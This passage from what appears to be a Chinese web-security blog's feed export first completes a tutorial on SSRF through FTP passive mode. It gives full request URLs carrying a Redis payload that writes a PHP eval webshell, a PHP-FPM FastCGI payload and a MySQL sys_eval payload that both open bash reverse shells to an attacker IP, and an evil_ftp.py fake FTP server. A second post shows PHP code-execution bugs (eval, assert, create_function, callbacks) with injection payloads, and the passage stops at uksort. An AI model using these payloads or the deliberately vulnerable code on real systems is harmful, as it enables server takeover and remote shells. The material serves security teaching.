<p>运行服务：</p>
<p><img src="https://s2.loli.net/2021/12/04/O96geY34DqGkuIN.png" alt="image-20211204164553969"></p>
<p>最后直接构造请求发送 Payload（无需进行二次URL编码）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hacktop.com/ssrf_2.php?file=ftp://192.168.123.241:23/123&amp;data=%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2435%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_POST%5B%22whoami%22%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A</span><br></pre></td></tr></table></figure>
<p>如下图所示，成功写入 Webshell：</p>
<p><img src="https://s2.loli.net/2021/12/04/3onchqS1BlLvVC9.png" alt="image-20211204164815249"></p>
<h2 id="SSRF利用FTP协议攻击PHP-FPM"><a href="#SSRF利用FTP协议攻击PHP-FPM" class="headerlink" title="SSRF利用FTP协议攻击PHP-FPM"></a>SSRF利用FTP协议攻击PHP-FPM</h2><p>假设此时发现内网中存在 PHP-FPM，那我们可以通过 FTP 的被动模式攻击内网的 PHP-FPM。</p>
<p>首先使用 <a href="https://github.com/tarunkant/Gopherus">Gopherus</a> 生成 Payload：</p>
<p><img src="https://s2.loli.net/2021/12/04/oPIKHciVwCWzSeU.png" alt="image-20211204175150701"></p>
<p>得到的 Payload 只要 <code>_</code> 后面的部分：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%0D%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH107%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%1FSCRIPT_FILENAME/usr/share/nginx/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00k%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.123.241/2333%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00</span><br></pre></td></tr></table></figure>
<p>然后还是在攻击机上运行 evil_ftp.py 启动一个伪 FTP 服务：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># evil_ftp.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) </span><br><span class="line">s.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">23</span>))		<span class="comment"># ftp服务绑定23号端口</span></span><br><span class="line">s.listen(<span class="number">1</span>)</span><br><span class="line">conn, addr = s.accept()</span><br><span class="line">conn.send(<span class="string">b&#x27;220 welcome\n&#x27;</span>)</span><br><span class="line"><span class="comment">#Service ready for new user.</span></span><br><span class="line"><span class="comment">#Client send anonymous username</span></span><br><span class="line"><span class="comment">#USER anonymous</span></span><br><span class="line">conn.send(<span class="string">b&#x27;331 Please specify the password.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#User name okay, need password.</span></span><br><span class="line"><span class="comment">#Client send anonymous password.</span></span><br><span class="line"><span class="comment">#PASS anonymous</span></span><br><span class="line">conn.send(<span class="string">b&#x27;230 Login successful.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#User logged in, proceed. Logged out if appropriate.</span></span><br><span class="line"><span class="comment">#TYPE I</span></span><br><span class="line">conn.send(<span class="string">b&#x27;200 Switching to Binary mode.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#Size /</span></span><br><span class="line">conn.send(<span class="string">b&#x27;550 Could not get the file size.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#EPSV (1)</span></span><br><span class="line">conn.send(<span class="string">b&#x27;150 ok\n&#x27;</span>)</span><br><span class="line"><span class="comment">#PASV</span></span><br><span class="line">conn.send(<span class="string">b&#x27;227 Entering Extended Passive Mode (127,0,0,1,0,9000)\n&#x27;</span>) <span class="comment">#STOR / (2) </span></span><br><span class="line"><span class="comment"># &quot;127,0,0,1&quot;PHP-FPM服务为受害者本地，&quot;9000&quot;为为PHP-FPM服务的端口号</span></span><br><span class="line">conn.send(<span class="string">b&#x27;150 Permission denied.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#QUIT</span></span><br><span class="line">conn.send(<span class="string">b&#x27;221 Goodbye.\n&#x27;</span>)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure>
<p>运行服务：</p>
<p><img src="https://s2.loli.net/2021/12/04/O96geY34DqGkuIN.png" alt="image-20211204164553969"></p>
<p>开启 nc 监听，等待反弹shell：</p>
<p><img src="https://s2.loli.net/2021/12/04/2DVYPbcy7jsCKFR.png" alt="image-20211204173444676"></p>
<p>最后构造请求发送 Payload 就行了：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hacktop.com/ssrf_2.php?file=ftp://192.168.123.241:23/123&amp;data=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%0D%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH107%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%1FSCRIPT_FILENAME/usr/share/nginx/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00k%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.123.241/2333%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/04/j1JxZKbqvIR8tpn.png" alt="image-20211204175318423"></p>
<p>如上图所示，成功反弹 Shell。</p>
<h2 id="SSRF利用FTP协议攻击MySQL"><a href="#SSRF利用FTP协议攻击MySQL" class="headerlink" title="SSRF利用FTP协议攻击MySQL"></a>SSRF利用FTP协议攻击MySQL</h2><p>有关如何利用MySQL未授权抓取数据包在上一节已经详细讲解过了，这里就不再讲解。</p>
<p>这里就直接使用上一节已经写入的动态链接库和用户定义函数直接执行系统命令。</p>
<p>首先使用Gopherus生成payload：</p>
<p><img src="https://s2.loli.net/2021/12/04/6x1tUwBZ5DnMm9F.png" alt="image-20211204185104110"></p>
<p>得到的 Payload 只要 <code>_</code> 后面的部分：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%a4%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%61%64%6d%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%67%00%00%00%03%73%65%6c%65%63%74%20%73%79%73%5f%65%76%61%6c%28%27%65%63%68%6f%20%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4f%54%49%75%4d%54%59%34%4c%6a%45%79%4d%79%34%79%4e%44%45%76%4e%44%51%30%4e%43%41%77%50%69%59%78%7c%62%61%73%65%36%34%20%2d%64%7c%62%61%73%68%20%2d%69%27%29%01%00%00%00%01</span><br></pre></td></tr></table></figure>
<p>然后还是在攻击机上运行 evil_ftp.py 启动一个伪 FTP 服务：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># evil_ftp.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) </span><br><span class="line">s.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">23</span>))		<span class="comment"># ftp服务绑定23号端口</span></span><br><span class="line">s.listen(<span class="number">1</span>)</span><br><span class="line">conn, addr = s.accept()</span><br><span class="line">conn.send(<span class="string">b&#x27;220 welcome\n&#x27;</span>)</span><br><span class="line"><span class="comment">#Service ready for new user.</span></span><br><span class="line"><span class="comment">#Client send anonymous username</span></span><br><span class="line"><span class="comment">#USER anonymous</span></span><br><span class="line">conn.send(<span class="string">b&#x27;331 Please specify the password.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#User name okay, need password.</span></span><br><span class="line"><span class="comment">#Client send anonymous password.</span></span><br><span class="line"><span class="comment">#PASS anonymous</span></span><br><span class="line">conn.send(<span class="string">b&#x27;230 Login successful.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#User logged in, proceed. Logged out if appropriate.</span></span><br><span class="line"><span class="comment">#TYPE I</span></span><br><span class="line">conn.send(<span class="string">b&#x27;200 Switching to Binary mode.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#Size /</span></span><br><span class="line">conn.send(<span class="string">b&#x27;550 Could not get the file size.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#EPSV (1)</span></span><br><span class="line">conn.send(<span class="string">b&#x27;150 ok\n&#x27;</span>)</span><br><span class="line"><span class="comment">#PASV</span></span><br><span class="line">conn.send(<span class="string">b&#x27;227 Entering Extended Passive Mode (127,0,0,1,0,9000)\n&#x27;</span>) <span class="comment">#STOR / (2) </span></span><br><span class="line"><span class="comment"># &quot;127,0,0,1&quot;MySQL服务为受害者本地，&quot;3306&quot;为为MySQL服务的端口号</span></span><br><span class="line">conn.send(<span class="string">b&#x27;150 Permission denied.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#QUIT</span></span><br><span class="line">conn.send(<span class="string">b&#x27;221 Goodbye.\n&#x27;</span>)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure>
<p>运行服务：</p>
<p><img src="https://s2.loli.net/2021/12/04/O96geY34DqGkuIN.png" alt="image-20211204164553969"></p>
<p>开启 nc 监听，等待反弹shell：</p>
<p><img src="https://s2.loli.net/2021/12/04/Uie9GbEp7QagmZk.png" alt="image-20211204185151930"></p>
<p>最后构造请求发送 Payload 就行了：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hacktop.com/ssrf_2.php?file=ftp://192.168.123.241:23/123&amp;data=%a4%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%61%64%6d%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%67%00%00%00%03%73%65%6c%65%63%74%20%73%79%73%5f%65%76%61%6c%28%27%65%63%68%6f%20%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4f%54%49%75%4d%54%59%34%4c%6a%45%79%4d%79%34%79%4e%44%45%76%4e%44%51%30%4e%43%41%77%50%69%59%78%7c%62%61%73%65%36%34%20%2d%64%7c%62%61%73%68%20%2d%69%27%29%01%00%00%00%01</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/04/RsVqLXDNY7H6x1B.png" alt="image-20211204185301024"></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li><a href="https://www.cnblogs.com/kezi/articles/11635028.html">搭建FTP服务器实现文件共享 - 科子 - 博客园 (cnblogs.com)</a></li>
<li><a href="https://whoamianony.top/2021/10/24/Web安全/教你用 FTP SSRF 打穿内网/">教你用 FTP SSRF 打穿内网 | WHOAMI’s Blog (whoamianony.top)</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/403107001">【技术干货】FTP在ssrf中的应用 - 知乎 (zhihu.com)</a></li>
</ul>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>SSRF服务端请求伪造</category>
      </categories>
      <tags>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>代码执行漏洞</title>
    <url>/post/7e08ba9.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote>
<p>当前各类网络业务应用系统的功能越来越多，给用户带来了各种业务便利和新的功能体验。在系统设计和开发过程中，软件工程师关注更多的是功能的可用性、易用性等方面，并没有注意程序代码所用的函数、实现的功能、执行的流程等方面是否安全。本节将从程序的函数参数、执行流程方面分析代码执行漏洞的原理。</p>
<p>代码执行漏洞是指用户通过客户端提交可执行命令代码，由于服务端没有针对函数的参数做有效过滤，导致系统执行非法命令代码。</p>
</blockquote>
<h2 id="代码执行函数"><a href="#代码执行函数" class="headerlink" title="代码执行函数"></a>代码执行函数</h2><p>所谓代码执行，就是通过参数、变量等指定可执行的代码，参数和变量中存储的将不再是数字、字符串等数值，而是可以执行的脚本代码或二进制代码。代码执行函数则是指可以实现代码执行的函数。在PHP语言和框架中，有很多代码执行函数，其参数可以接收代码值并触发执行该代码。一旦将有风险的代码通过函数参数传递给这些函数，就很容易执行恶意操作，触发安全漏洞。例如<code>eval()</code>、<code>assert()</code>、<code>preg_replace()</code>、<code>call_user_func()</code>、<code>call_user_func_array()</code>、<code>create_function()</code>、<code>array_map()</code>等函数，最常见的如动态函数<code>$a($b)</code>等，代码执行漏洞就是因为上述这些函数的参数是用户可控的，而服务器端没有针对这些可控的参数进行有效的过滤，导致可控的参数被赋值恶意代码，进入命令执行函数被执行。</p>
<p>代码执行漏洞的另一种常见利用方式是通过文件包含函数，例如<code>include()</code>、<code>include_once()</code>、<code>require_once()</code>、<code>file_get_contents()</code>、<code>file_put_contents()</code>、<code>fwrite()</code>等，将恶意代码嵌入程序当前的执行空间，从而触发代码执行漏洞。</p>
<h3 id="eval-函数"><a href="#eval-函数" class="headerlink" title="eval() 函数"></a>eval() 函数</h3><p><code>eval()</code>函数把参数的字符串值当作PHP代码来执行，当字符串是合法的PHP代码且以分号作为行结尾时，代码在服务端的运行效果与通过该函数触发执行效果相同。</p>
<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p>漏洞代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="variable">$data</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">   <span class="keyword">eval</span>(<span class="string">&quot;\$ret=strtolower(\&quot;<span class="subst">$data</span>\&quot;);&quot;</span>);</span><br><span class="line">   <span class="keyword">echo</span> <span class="variable">$ret</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这段代码的作用是将get请求到的字符串转换成小写字母并输出</p>
<p>正常请求如下：</p>
<p><img src="https://s2.loli.net/2021/12/07/4qdhsZ762UXmGEA.png" alt="image-20211207175306966"></p>
<p>但是我们可以通过构造闭合括号的双引号进行代码注入攻击</p>
<p><img src="https://s2.loli.net/2021/12/07/rtREJ9DMnp1sZ58.png" alt="image-20211207175419555"></p>
<p>将payload带入源代码（传参时会自动进行转义）：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;\$ret=strtolower(\&quot;A\&quot;);phpinfo();(\&quot;A\&quot;);&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>因为<code>eval()</code>函数会以分号为分隔执行代码，所以执行的PHP代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ret</span>=strtolower(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">phpinfo();</span><br><span class="line">(<span class="string">&quot;A&quot;</span>);<span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
<p>触发嵌入的<code>phpinfo()</code>代码便能成功执行</p>
<blockquote>
<p>注：eval 是一个语言构造器而不是一个函数，不能被<strong>可变函数</strong>调用</p>
</blockquote>
<h3 id="assert-函数"><a href="#assert-函数" class="headerlink" title="assert() 函数"></a>assert() 函数</h3><p>PHP语言的<code>assert()</code>函数判断一个表达式是否成立，返回<code>true</code>或<code>false</code>。当其参数为多个字符组成的字符串时，该函数首先将字符串当作PHP代码执行，并将代码执行的返回结果作为表达式判断是否有效。</p>
<p>与<code>eval()</code>不同的是<code>assert()</code>只能执行一条php代码，所以不需要增加分号。</p>
<h4 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h4><p>漏洞代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="variable">$data</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">   assert(<span class="string">&quot;<span class="subst">$data</span>&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/07/gCaSTnlBmveyMRU.png" alt="image-20211207185417879"></p>
<blockquote>
<p>注：自PHP_8 起<code>assert()</code>不再支持执行代码了</p>
</blockquote>
<h3 id="preg-replace-函数"><a href="#preg-replace-函数" class="headerlink" title="preg_replace() 函数"></a>preg_replace() 函数</h3><p><code>preg_replace()</code>函数有三个参数：</p>
<ol>
<li><p>第一个参数是要搜索的模式，可以是字符串或一个字符串数组；</p>
</li>
<li><p>第二个参数是用于替换的字符串或字符串数组；</p>
</li>
<li>第三个参数pattern存在的/e模式修饰符且PHP配置的<code>magic_quotes_gpc=Off</code>时，函数会将第二个参数值当作PHP代码进行解析执行。该函数的三个参数都是用户可控的，因此，函数具备成为代码执行漏洞的条件。</li>
</ol>
<h4 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h4><p>漏洞代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$pattern</span> = <span class="string">&quot;/\d/e&quot;</span>;</span><br><span class="line">	<span class="variable">$replacement</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;rp&#x27;</span>];</span><br><span class="line">	<span class="variable">$subject</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;sub&#x27;</span>];</span><br><span class="line">	<span class="variable">$str</span> = preg_replace(<span class="variable">$pattern</span>,<span class="variable">$replacement</span>,<span class="variable">$subject</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这段代码的作用是将匹配get传递sub参数中的数字部分替换为get传递的rp参数的值</p>
<p>正常请求如下：</p>
<p><img src="https://s2.loli.net/2021/12/07/jNkTYAB4VgaXdQJ.png" alt="image-20211207205511824"></p>
<p>但是我们可以把替换的值改为执行的PHP代码，成功触发漏洞</p>
<p><img src="https://s2.loli.net/2021/12/07/NkjPvRB5yTlCrnY.png" alt="image-20211207214228358"></p>
<blockquote>
<p>注：自PHP5.5.0版本起 <code>/e</code> 修饰符被弃用，无法使用该函数执行代码</p>
</blockquote>
<h3 id="create-function-函数"><a href="#create-function-函数" class="headerlink" title="create_function() 函数"></a>create_function() 函数</h3><p><code>create_function()</code>函数主要用来创建匿名函数，如果没有严格对参数传递进行过滤，攻击者可以构造特殊字符串传递给<code>create_function()</code>执行任意命令。</p>
<h4 id="示例-3"><a href="#示例-3" class="headerlink" title="示例"></a>示例</h4><p>漏洞代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$n1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">	<span class="variable">$n2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line">	<span class="variable">$cont</span> = <span class="string">&quot;return &quot;</span>.(<span class="variable">$n1</span>.<span class="variable">$n2</span>).<span class="string">&quot;;&quot;</span>;</span><br><span class="line">	<span class="variable">$func1</span> = create_function(<span class="string">&#x27;$a,$b&#x27;</span>, <span class="variable">$cont</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$func1</span>(<span class="variable">$n1</span>,<span class="variable">$n2</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>执行函数为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func1</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$a</span>.<span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这段代码的作用是将两个get请求到的字符串拼接并输出</p>
<p>正常请求如下：</p>
<p><img src="https://s2.loli.net/2021/12/08/3ktYgCq7deLSpfo.png" alt="image-20211208123919144"></p>
<p>我们可以通过闭合函数前面与后面的大括号，来达到代码注入</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a=abc&amp;b=ddd;&#125;phpinfo();&#123;123</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/08/yc9rxdYjtHVQ6To.png" alt="image-20211208124749298"></p>
<p>注入后执行的函数：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func1</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&#x27;abc&#x27;</span>.<span class="string">&#x27;ddd&#x27;</span>;&#125;</span><br><span class="line">phpinfo();</span><br><span class="line">&#123;<span class="number">123</span>&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="array-map-函数"><a href="#array-map-函数" class="headerlink" title="array_map() 函数"></a>array_map() 函数</h3><p><code>array_map()</code>函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。它的第一个参数是回调函数，第二个参数是要处理的数组。回调函数接受的参数数目应该和传递给<code>array_map()</code>函数的数组数目一致。</p>
<h4 id="示例-4"><a href="#示例-4" class="headerlink" title="示例"></a>示例</h4><p>漏洞代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$func</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>];</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$array</span>[<span class="number">0</span>]=<span class="variable">$cmd</span>;</span><br><span class="line"><span class="variable">$new_array</span>=array_map(<span class="variable">$func</span>,<span class="variable">$array</span>);</span><br><span class="line">print_r(<span class="variable">$new_array</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?func=phpinfo&amp;cmd=1</span><br></pre></td></tr></table></figure>
<h3 id="array-filter-函数"><a href="#array-filter-函数" class="headerlink" title="array_filter() 函数"></a>array_filter() 函数</h3><p><code>array_filter()</code>函数用回调函数过滤数组中的值。该函数把输入数组中的每个键值传给回调函数。如果回调函数返回 true，则把输入数组中的当前键值返回结果数组中。数组键名保持不变。</p>
<h4 id="示例-5"><a href="#示例-5" class="headerlink" title="示例"></a>示例</h4><p>漏洞代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$array1</span>=<span class="keyword">array</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="variable">$func</span> =<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>];</span><br><span class="line">array_filter(<span class="variable">$array1</span>,<span class="variable">$func</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?func=phpinfo&amp;cmd=1</span><br></pre></td></tr></table></figure>
<h3 id="call-user-func-call-user-func-array-函数"><a href="#call-user-func-call-user-func-array-函数" class="headerlink" title="call_user_func() / call_user_func_array() 函数"></a>call_user_func() / call_user_func_array() 函数</h3><p><code>call_user_func()</code> —— 把第一个参数作为回调函数调用，其余参数是回调函数的参数。</p>
<p><code>call_user_func_array()</code> —— 调用回调函数，并把一个数组参数作为回调函数的参数。</p>
<h4 id="示例-6"><a href="#示例-6" class="headerlink" title="示例"></a>示例</h4><p>漏洞代码如下：</p>
<p><code>call_user_func()</code>：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">call_user_func(assert,<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>call_user_func_array()</code>：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$array</span>[<span class="number">0</span>]=<span class="variable">$cmd</span>;</span><br><span class="line">call_user_func_array(<span class="string">&quot;assert&quot;</span>,<span class="variable">$array</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cmd=phpinfo</span><br></pre></td></tr></table></figure>
<h3 id="usort-uasort-uksort-函数"><a href="#usort-uasort-uksort-函数" class="headerlink" title="usort() / uasort() / uksort() 函数"></a>usort() / uasort() / uksort() 函数</h3><p><code>usort()</code>通过用户自定义的比较函数对数组进行排序。</p>
<p><code>uasort()</code>使用用户自定义的比较函数对数组中的值进行排序并保持索引关联 。</p>
<h4 id="示例-7"><a href="#示例-7" class="headerlink" title="示例"></a>示例</h4><p>漏洞代码如下：</p>
<p><code>usort()</code>：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	<span class="variable">$str1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;str1&#x27;</span>];</span><br><span class="line">	<span class="variable">$str2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;str2&#x27;</span>];</span><br><span class="line">	<span class="variable">$str</span> = <span class="keyword">array</span>(<span class="variable">$str1</span>,<span class="variable">$str2</span>);</span><br><span class="line">	usort(<span class="variable">$str</span>,<span class="string">&#x27;assert&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>uasort()</code>：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	<span class="variable">$str1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;str1&#x27;</span>];</span><br><span class="line">	<span class="variable">$str2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;str2&#x27;</span>];</span><br><span class="line">	<span class="variable">$str</span> = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>=&gt;<span class="variable">$str1</span>,<span class="string">&#x27;b&#x27;</span>=&gt;<span class="variable">$str2</span>);</span><br><span class="line">	uasort(<span class="variable">$str</span>,<span class="string">&#x27;assert&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>uksort()</code>：</p>
